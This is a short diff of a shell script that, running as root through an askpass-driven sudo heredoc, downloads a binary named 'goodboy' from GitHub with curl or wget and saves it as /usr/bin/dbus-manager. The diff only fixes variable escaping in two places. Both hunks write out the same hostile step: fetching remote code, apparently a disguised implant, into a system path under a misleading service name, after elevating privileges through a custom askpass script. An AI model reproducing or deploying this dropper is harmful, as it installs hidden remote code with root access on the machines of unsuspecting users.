@@ -11,8 +11,8 @@ if [ "$EUID" -eq 0 ]; then
 
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
     GOOD_BOY_FILE="/usr/bin/dbus-manager"
-    curl -L -s -o $GOOD_BOY_FILE $GOOD_BOY_URL || \
-    wget -q -O $GOOD_BOY_FILE $GOOD_BOY_URL
+    curl -L -s -o \$GOOD_BOY_FILE \$GOOD_BOY_URL || \
+    wget -q -O \$GOOD_BOY_FILE \$GOOD_BOY_URL
     if [ ! -f /usr/bin/dbus-manager ]; then
         exit 1
     fi
@@ -91,8 +91,8 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
 
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
     GOOD_BOY_FILE="/usr/bin/dbus-manager"
-    curl -L -s -o $GOOD_BOY_FILE $GOOD_BOY_URL || \
-    wget -q -O $GOOD_BOY_FILE $GOOD_BOY_URL
+    curl -L -s -o \$GOOD_BOY_FILE \$GOOD_BOY_URL || \
+    wget -q -O \$GOOD_BOY_FILE \$GOOD_BOY_URL
 
     if [ ! -f /usr/bin/dbus-manager ]; then
         exit 1
